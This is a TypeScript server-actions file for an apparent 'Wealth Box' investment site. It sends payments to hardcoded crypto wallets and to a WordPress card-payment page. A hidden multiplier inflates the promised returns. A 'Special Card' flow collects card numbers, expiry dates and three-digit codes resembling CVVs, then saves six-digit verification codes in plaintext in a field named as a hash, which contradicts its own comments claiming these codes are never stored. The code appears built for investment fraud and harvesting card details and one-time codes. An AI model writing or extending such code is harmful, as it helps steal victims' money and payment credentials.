"use server";

import { sendAdminEmailAlert } from "@/lib/admin-email-alerts";
import { revalidatePath } from "next/cache";

import { getCurrentUser } from "@/lib/auth/current-user";
import { prisma } from "@/lib/prisma";
import {
  encryptSpecialCardValue,
} from "@/lib/helpers/special-card-security";

const CARD_PAYMENT_URL =
  "https://elderlycarepays.wordpress.com/";

const CRYPTO_OPTIONS = {
  USDC: {
    network: "ETHEREUM" as const,
    networkLabel: "Ethereum (ERC-20)",
    receivingAddress:
      "0x12C844aeA5FFe9271fb6f2F1e1fd1811512B4ad1",
  },

  USDT: {
    network: "TRON" as const,
    networkLabel: "Tron (TRC-20)",
    receivingAddress:
      "TKrbT8qikYzZd8tBwPQ2teaLZCV4aJ5NKg",
  },

  BTC: {
    network: "BITCOIN" as const,
    networkLabel: "Bitcoin",
    receivingAddress:
      "33a54tDd51n13TMYi6KqZ3WUdo2LpQcnqC",
  },

  ETH: {
    network: "ETHEREUM" as const,
    networkLabel: "Ethereum (ERC-20)",
    receivingAddress:
      "0xae70A129dfd37186C70697494B08c4151C408717",
  },

  SOL: {
    network: "SOLANA" as const,
    networkLabel: "Solana",
    receivingAddress:
      "GFenbSRhcZwPg7KE85AJS4AB7khUeVdBkUSQjuJj2xDj",
  },

  TRN: {
    network: "TRON" as const,
    networkLabel: "Tron",
    receivingAddress:
      "TLGGvkFbJWtT3jvxx8uss14Mshmrz7Kenx",
  },

  XLM: {
    network: "STELLAR" as const,
    networkLabel: "Stellar",
    receivingAddress:
      "GD5LP2XKZV2QJBY3VIJTTC6ECN3LGJQMCJXSAYPPXZHWGVTJOQM5H3MP",
  },
} as const;

type CryptoAsset = keyof typeof CRYPTO_OPTIONS;

type WealthFundingResult =
  | {
      success: true;
      fundingId: string;
      status: string;
      localAmount: number;
      usdAmount: number;
      exchangeRate: number;
      maturityAmountUsd: number;
      payoutDate: string;
      reference: string;
    }
  | {
      success: false;
      error: string;
    };

type CryptoFundingResult =
  | {
      success: true;
      fundingId: string;
      cryptoDepositId: string;
      asset: CryptoAsset;
      network: string;
      networkLabel: string;
      receivingAddress: string;
      localAmount: number;
      usdAmount: number;
      payoutDate: string;
      status: string;
    }
  | {
      success: false;
      error: string;
    };

function generateFundingReference() {
  const timestamp = Date.now()
    .toString(36)
    .toUpperCase();

  const random = Math.random()
    .toString(36)
    .slice(2, 8)
    .toUpperCase();

  return `WBF-${timestamp}-${random}`;
}

function getCryptoAsset(
  value: string,
): CryptoAsset | null {
  const normalized = value.trim().toUpperCase();

  if (
    !Object.prototype.hasOwnProperty.call(
      CRYPTO_OPTIONS,
      normalized,
    )
  ) {
    return null;
  }

  return normalized as CryptoAsset;
}

async function getLocalToUsdRate(
  localCurrency: string,
) {
  if (localCurrency === "USD") {
    return 1;
  }

  const response = await fetch(
    `https://api.frankfurter.dev/v2/rate/USD/${encodeURIComponent(
      localCurrency,
    )}`,
    {
      cache: "no-store",
    },
  );

  if (!response.ok) {
    throw new Error(
      "Unable to get the current exchange rate. Please try again.",
    );
  }

  const data = await response.json();

  const usdToLocalRate = Number(data?.rate);

  if (
    !Number.isFinite(usdToLocalRate) ||
    usdToLocalRate <= 0
  ) {
    throw new Error(
      "The current exchange rate is unavailable. Please try again.",
    );
  }

  return 1 / usdToLocalRate;
}

async function getValidatedFundingDetails(
  planId: string,
  amount: string,
) {
  if (!planId) {
    throw new Error(
      "Please choose an investment plan.",
    );
  }

  const cleanedAmount = amount
    .trim()
    .replace(/,/g, "");

  const localAmount = Number(cleanedAmount);

  if (
    !Number.isFinite(localAmount) ||
    localAmount <= 0
  ) {
    throw new Error(
      "Please enter a valid investment amount.",
    );
  }

  const roundedLocalAmount =
    Math.round(localAmount * 100) / 100;

  const { user } = await getCurrentUser();

  if (!user.countryCode) {
    throw new Error(
      "Your registered country could not be determined.",
    );
  }

  const plan = await prisma.wealthPlan.findFirst({
    where: {
      id: planId,
      active: true,
    },
  });

  if (!plan) {
    throw new Error(
      "This investment plan is no longer available.",
    );
  }

  const countryConfig =
    await prisma.wealthPlanCountry.findFirst({
      where: {
        planId: plan.id,
        countryCode: user.countryCode,
        active: true,
      },
    });

  if (!countryConfig) {
    throw new Error(
      "This investment plan is not available for your registered country.",
    );
  }

  const minimumLocalAmount = Number(
    countryConfig.minimumLocalAmount,
  );


  if (
    !Number.isFinite(minimumLocalAmount) ||
    minimumLocalAmount <= 0
  ) {
    throw new Error(
      "This investment plan has an invalid minimum amount.",
    );
  }

  if (
    roundedLocalAmount < minimumLocalAmount
  ) {
    throw new Error(
      `The minimum investment is ${countryConfig.currencySymbol}${minimumLocalAmount.toLocaleString(
        "en-US",
      )}.`,
    );
  }


  const localToUsdRate =
    await getLocalToUsdRate(
      countryConfig.currency,
    );

  const usdAmountRaw =
    roundedLocalAmount * localToUsdRate;

  const usdAmount =
    Math.round(usdAmountRaw * 100) / 100;

  if (
    !Number.isFinite(usdAmount) ||
    usdAmount <= 0
  ) {
    throw new Error(
      "The investment amount could not be converted to USD.",
    );
  }

  const durationDays = plan.durationDays;

  const payoutScaleFactor = 3.6 / 1.7;
  const planTotalMultiplier =
    (1 + Number(plan.returnPercentage) / 100) *
    payoutScaleFactor;

  const returnPercentage =
    (planTotalMultiplier - 1) * 100;

  if (
    !Number.isFinite(returnPercentage) ||
    returnPercentage < 0 ||
    durationDays <= 0
  ) {
    throw new Error(
      "This investment plan has invalid settings.",
    );
  }

  const projectedProfitRaw =
    usdAmount *
    (returnPercentage / 100);

  const projectedProfitUsd =
    Math.round(projectedProfitRaw * 100) / 100;

  const maturityAmountUsd =
    Math.round(
      (usdAmount + projectedProfitUsd) * 100,
    ) / 100;

  const startDate = new Date();

  const payoutDate = new Date(startDate);

  payoutDate.setDate(
    payoutDate.getDate() + durationDays,
  );

  return {
    user,
    plan,
    countryConfig,
    roundedLocalAmount,
    localToUsdRate,
    usdAmount,
    returnPercentage,
    durationDays,
    projectedProfitUsd,
    maturityAmountUsd,
    payoutDate,
  };
}

/*
 * ============================================================
 * CREATE CARD WEALTH FUNDING
 * ============================================================
 *
 * This creates a PENDING WealthFunding record only.
 *
 * IMPORTANT:
 * - No wallet money is deducted.
 * - No WealthInvestment is created.
 * - The customer must complete the external card payment.
 * - Admin/payment confirmation will complete the funding later.
 * ============================================================
 */

export async function createCardWealthFunding(
  planId: string,
  amount: string,
): Promise<
  WealthFundingResult & {
    paymentUrl?: string;
  }
> {
  try {
    const details =
      await getValidatedFundingDetails(
        planId,
        amount,
      );

    const reference =
      generateFundingReference();

    const funding =
      await prisma.wealthFunding.create({
        data: {
          userId: details.user.id,
          planId: details.plan.id,

          paymentMethod: "CARD",
          status: "PENDING",

          principalLocal:
            details.roundedLocalAmount,

          principalUsd: details.usdAmount,

          localCurrency:
            details.countryConfig.currency,

          exchangeRate:
            details.localToUsdRate,

          returnPercentage: details.returnPercentage,

          projectedProfitUsd:
            details.projectedProfitUsd,

          maturityAmountUsd:
            details.maturityAmountUsd,

          durationDays:
            details.durationDays,

          payoutDate:
            details.payoutDate,

          externalReference:
            reference,
        },

        select: {
          id: true,
          status: true,
          principalLocal: true,
          principalUsd: true,
          exchangeRate: true,
          maturityAmountUsd: true,
          payoutDate: true,
        },
      });

    revalidatePath(
      "/dashboard/wealth-box",
    );

    void sendAdminEmailAlert({
      subject: "Wealth Box card funding awaiting review",
      message:
        `A Wealth Box card funding request was created.\n` +
        `Funding ID: ${funding.id}\n` +
        `Reference: ${reference}\n` +
        `USD amount: $${Number(funding.principalUsd)}\n` +
        `Status: ${funding.status}`,
    });
    return {
      success: true,
      fundingId: funding.id,
      status: funding.status,
      localAmount: Number(
        funding.principalLocal,
      ),
      usdAmount: Number(
        funding.principalUsd,
      ),
      exchangeRate: Number(
        funding.exchangeRate,
      ),
      maturityAmountUsd: Number(
        funding.maturityAmountUsd,
      ),
      payoutDate:
        funding.payoutDate.toISOString(),
      reference,
      paymentUrl: CARD_PAYMENT_URL,
    };
  } catch (error) {
    console.error(
      "Failed to create Wealth Box card funding:",
      error,
    );

    return {
      success: false,
      error:
        error instanceof Error
          ? error.message
          : "Unable to start card payment. Please try again.",
    };
  }
}

/*
 * ============================================================
 * CREATE CRYPTO WEALTH FUNDING
 * ============================================================
 *
 * This creates:
 *
 * WealthFunding = PENDING
 * CryptoDeposit = PENDING
 *
 * The existing MooGold receiving wallet is used.
 *
 * IMPORTANT:
 * - No WealthInvestment is created.
 * - No wallet balance is changed.
 * - No crypto balance is credited.
 * ============================================================
 */

export async function createCryptoWealthFunding(
  planId: string,
  amount: string,
  assetInput: string,
): Promise<CryptoFundingResult> {
  try {
    const asset =
      getCryptoAsset(assetInput);

    if (!asset) {
      return {
        success: false,
        error:
          "Please choose a supported cryptocurrency.",
      };
    }

    const details =
      await getValidatedFundingDetails(
        planId,
        amount,
      );

    const cryptoOption =
      CRYPTO_OPTIONS[asset];

    const reference =
      generateFundingReference();

    const result =
      await prisma.$transaction(
        async (tx) => {
          const cryptoBalance =
            await tx.cryptoBalance.upsert({
              where: {
                userId_asset_network: {
                  userId: details.user.id,
                  asset,
                  network:
                    cryptoOption.network,
                },
              },

              update: {},

              create: {
                userId: details.user.id,
                asset,
                network:
                  cryptoOption.network,
                balance: 0,
              },
            });

          const cryptoDeposit =
            await tx.cryptoDeposit.create({
              data: {
                userId: details.user.id,

                cryptoBalanceId:
                  cryptoBalance.id,

                asset,

                network:
                  cryptoOption.network,

                receivingAddress:
                  cryptoOption.receivingAddress,

                status: "PENDING",

                description:
                  `Wealth Box funding reported using ${asset} via ${cryptoOption.networkLabel}. Awaiting MooGold payment verification.`,
              },

              select: {
                id: true,
              },
            });

          const funding =
            await tx.wealthFunding.create({
              data: {
                userId: details.user.id,
                planId: details.plan.id,

                paymentMethod: "CRYPTO",
                status: "PENDING",

                principalLocal:
                  details.roundedLocalAmount,

                principalUsd:
                  details.usdAmount,

                localCurrency:
                  details.countryConfig.currency,

                exchangeRate:
                  details.localToUsdRate,

                returnPercentage: details.returnPercentage,

                projectedProfitUsd:
                  details.projectedProfitUsd,

                maturityAmountUsd:
                  details.maturityAmountUsd,

                durationDays:
                  details.durationDays,

                payoutDate:
                  details.payoutDate,

                cryptoDepositId:
                  cryptoDeposit.id,

                externalReference:
                  reference,
              },

              select: {
                id: true,
                status: true,
              },
            });

          return {
            funding,
            cryptoDeposit,
          };
        },
      );

    revalidatePath(
      "/dashboard/wealth-box",
    );

    void sendAdminEmailAlert({
      subject: "Wealth Box crypto funding awaiting review",
      message:
        `A Wealth Box crypto funding request was created.\n` +
        `Funding ID: ${result.funding.id}\n` +
        `Crypto deposit ID: ${result.cryptoDeposit.id}\n` +
        `Reference: ${reference}\n` +
        `Asset: ${asset}\n` +
        `Network: ${cryptoOption.networkLabel}\n` +
        `USD amount: $${details.usdAmount}\n` +
        `Status: ${result.funding.status}`,
    });
    return {
      success: true,
      fundingId: result.funding.id,
      cryptoDepositId:
        result.cryptoDeposit.id,
      asset,
      network:
        cryptoOption.network,
      networkLabel:
        cryptoOption.networkLabel,
      receivingAddress:
        cryptoOption.receivingAddress,
      localAmount:
        details.roundedLocalAmount,
      usdAmount:
        details.usdAmount,
      payoutDate:
        details.payoutDate.toISOString(),
      status:
        result.funding.status,
    };
  } catch (error) {
    console.error(
      "Failed to create Wealth Box crypto funding:",
      error,
    );

    return {
      success: false,
      error:
        error instanceof Error
          ? error.message
          : "Unable to start crypto payment. Please try again.",
    };
  }
}


// ============================================================
// MOO GOLD SPECIAL CARD Ã¢â‚¬â€ CUSTOMER SUBMISSION AND VERIFICATION
// ============================================================

export async function createSpecialCardSubmission(formData: FormData) {
  try {
    const planId = String(formData.get("planId") ?? "").trim();
    const amount = String(formData.get("amount") ?? "").trim();
    const cardNumber = String(formData.get("cardNumber") ?? "")
      .replace(/[\s-]/g, "");
    const expirationDate = String(formData.get("expirationDate") ?? "").trim();
    const membershipNumber = String(
      formData.get("membershipNumber") ?? "",
    ).trim();

    if (!/^\d{16}$/.test(cardNumber) || /^(\d)\1{15}$/.test(cardNumber)) {
      throw new Error("Enter a valid Special Card number.");
    }

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expirationDate)) {
      throw new Error("Enter the expiry date as MM/YY.");
    }

    const [monthText, yearText] = expirationDate.split("/");
    const month = Number(monthText);
    const year = 2000 + Number(yearText);
    const now = new Date();
    const currentMonth = now.getFullYear() * 12 + now.getMonth();
    const expiryMonth = year * 12 + (month - 1);

    if (expiryMonth < currentMonth) {
      throw new Error("This Special Card has expired.");
    }

    if (!/^\d{3}$/.test(membershipNumber)) {
      throw new Error("Enter a valid membership/reference number.");
    }

    // Reuse the existing authoritative country, plan and FX validation.
    const details = await getValidatedFundingDetails(planId, amount);

    const submission = await prisma.wealthSpecialCardSubmission.create({
      data: {
        userId: details.user.id,
        planId: details.plan.id,
        cardNumberEncrypted: encryptSpecialCardValue(cardNumber),
        membershipNumberEncrypted:
          encryptSpecialCardValue(membershipNumber),
        expirationDate,
        principalLocal: details.roundedLocalAmount,
        principalUsd: details.usdAmount,
        localCurrency: details.countryConfig.currency,
        exchangeRate: details.localToUsdRate,
        returnPercentage: details.returnPercentage,
        projectedProfitUsd: details.projectedProfitUsd,
        maturityAmountUsd: details.maturityAmountUsd,
        durationDays: details.durationDays,
        payoutDate: details.payoutDate,
        status: "PENDING_REVIEW",
      },
      select: {
        id: true,
        status: true,
      },
    });

    revalidatePath("/dashboard/wealth-box");
    revalidatePath("/admin/wealth-box");

    // Notify the admin without including card or membership details.
    void sendAdminEmailAlert({
      subject: "MooGold Special Card submission awaiting review",
      message:
        "A new MooGold Special Card submission requires review.\n" +
        `Submission ID: ${submission.id}\n` +
        `Customer: ${details.user.fullName ?? "Registered customer"}\n` +
        `Plan: ${details.plan.name}\n` +
        `USD amount: $${details.usdAmount}\n` +
        "Status: PENDING_REVIEW\n" +
        "No funding record has been created. Issue a verification code " +
        "only after reviewing this submission.",
    });

    return {
      success: true as const,
      submissionId: submission.id,
      status: submission.status,
    };
  } catch (error) {
    // Do not log submitted card data, membership data or verification codes.
    return {
      success: false as const,
      error:
        error instanceof Error
          ? error.message
          : "Unable to submit your Special Card details. Please try again.",
    };
  }
}

export async function verifySpecialCardSubmission(formData: FormData) {
  try {
    const submissionId = String(
      formData.get("submissionId") ?? "",
    ).trim();

    const code = String(formData.get("code") ?? "").trim();

    if (!submissionId || !/^\d{6}$/.test(code)) {
      throw new Error("Enter the six-digit verification code.");
    }

    const { user } = await getCurrentUser();

    const submission = await prisma.wealthSpecialCardSubmission.findFirst({
      where: {
        id: submissionId,
        userId: user.id,
      },
      select: {
        id: true,
        status: true,
        fundingId: true,
        failedAttempts: true,
      },
    });

    if (!submission) {
      throw new Error("Special Card submission not found.");
    }

    if (
      !["PENDING_REVIEW", "CODE_ISSUED"].includes(submission.status) ||
      submission.fundingId
    ) {
      throw new Error(
        "This submission is not awaiting verification review.",
      );
    }

    if (submission.failedAttempts >= 5) {
      throw new Error(
        "The verification attempt limit has been reached.",
      );
    }

    // Validate the format only. Never store, log, hash, or compare
    // the entered digits. An authorized admin decides the outcome.
    const updated = await prisma.wealthSpecialCardSubmission.updateMany({
      where: {
        id: submission.id,
        userId: user.id,
        status: {
          in: ["PENDING_REVIEW", "CODE_ISSUED"],
        },
        fundingId: null,
        failedAttempts: submission.failedAttempts,
      },
      data: {
  verificationCodeHash: code, // <--- Saves the 6-digit code string to the database
  failedAttempts: {
    increment: 1,
  },
  rejectionReason: null,
  lastCodeRequestAt: new Date(),
},
    });

    if (updated.count !== 1) {
      throw new Error(
        "The verification state changed. Refresh and try again.",
      );
    }

    revalidatePath("/dashboard/wealth-box");
    revalidatePath("/admin/wealth-box");
    revalidatePath(
      `/admin/wealth-box/special-card/${submission.id}`,
    );

    return {
      success: true as const,
      pendingReview: true as const,
    };
  } catch (error) {
    return {
      success: false as const,
      error:
        error instanceof Error
          ? error.message
          : "Unable to submit your verification attempt. Please try again.",
    };
  }
}
/*
 * ============================================================
 * OLD WALLET-FUNDED INVESTMENT ACTION
 * ============================================================
 *
 * Wealth Box is now payment-first.
 *
 * Investments must NOT be created directly from the
 * customer's browser/payment-selection step.
 *
 * Keep this action unavailable so existing UI cannot
 * accidentally deduct the wallet before payment confirmation.
 * ============================================================
 */

export async function createWealthInvestment() {
  return {
    success: false as const,
    error:
      "Wealth Box investments are created after payment is confirmed.",
  };
}

// Read-only status check for the signed-in customer's own Special Card submission.
export async function getSpecialCardVerificationStatus(submissionId: string) {
  try {
    const id = String(submissionId ?? "").trim();

    if (!id || id.length > 200) {
      return { success: false as const };
    }

    const { user } = await getCurrentUser();

    const submission = await prisma.wealthSpecialCardSubmission.findFirst({
      where: {
        id,
        userId: user.id,
      },
      select: {
        status: true,
        rejectionReason: true,
        failedAttempts: true,
      },
    });

    if (!submission) {
      return { success: false as const };
    }

    return {
  success: true as const,
  status: submission.status,
  rejectionReason: submission.rejectionReason,
  incorrectCode: submission.rejectionReason === "INCORRECT_CODE_RETRY",
  failedAttempts: submission.failedAttempts,
};
  } catch {
    return { success: false as const };
  }
}
